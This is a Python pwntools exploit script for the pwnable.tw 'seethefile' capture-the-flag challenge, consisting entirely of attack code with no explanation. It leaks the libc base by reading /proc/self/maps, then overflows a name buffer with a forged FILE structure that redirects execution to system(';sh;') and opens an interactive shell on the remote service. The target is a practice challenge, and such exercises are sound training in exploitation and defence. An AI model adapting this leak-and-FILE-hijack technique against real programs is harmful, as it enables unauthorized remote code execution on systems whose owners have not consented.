from pwn import *

slnaf = lambda delim, data: p.sendlineafter(delim, data)

elf = context.binary = ELF('seethefile')
libc = ELF('libc.so.6')

def open_file(name):
    slnaf(b'Your choice :', b'1')
    slnaf(b'you want to see :', name)
def read_file():
    slnaf(b'Your choice :', b'2')
def write_file():
    slnaf(b'Your choice :', b'3')
#nc chall.pwnable.tw 10200

p = remote('chall.pwnable.tw', 10200)
#p = process()
#gdb.attach(p, gdbscript='''
#           b fclose
#c''')

open_file(b'/proc/self/maps')
read_file()
read_file()
write_file()
leak = p.recvuntil(b'000-')[:-1]
leak = leak[-8:]
leak = int(leak.decode(), 16)
#print(p.recv(0x100))


print('leak: {}'.format(hex(leak)))
libc.address = leak
print('libc: ', hex(libc.address))

#i = 1
#while(1):
#    for j in range(i):
#        read_file()
#    write_file()
#    leak = p.recvuntil(b'---------------MENU---------------')
#    if(b'libc' in leak):
#        break
#    i += 1
#leak = leak[leak.find(b'f7'):leak.find(b'f7') + 8]
#leak = int(leak.decode(), 16)
#print('leak: ', hex(leak))
#libc.address = leak - 0x1ae000
#print('libc: ', hex(libc.address))

ONE_GADGET = 0x3a819 + libc.address
print('one_gadget: ', hex(ONE_GADGET))
NAME = 0x804b260
#payload = p32(0xfbad4141)
#payload += b';sh;'.ljust(20, b'A')
#payload += p32(libc.symbols['system'])
#payload += b'A'*4
#payload += p32(NAME)
#payload += p32(NAME - 0x10)*0xa
#payload += p32(NAME + 0x10)
#payload += p32(NAME - 0x10)*0x8

payload = b'A'*0x20
payload += p32(NAME + 0x24)
payload += p32(0xfbad4141)
payload += b';sh;'.ljust(20, b'A')
payload += p32(libc.symbols['system'])
payload += b'A'*4
payload += p32(NAME + 0x28)
payload += p32(NAME - 0x10)*0xa
payload += p32(NAME + 0x10 + 0x24)
payload += p32(NAME - 0x10)*0x8

slnaf(b'Your choice :', b'5')
slnaf(b'your name :', payload)


p.interactive()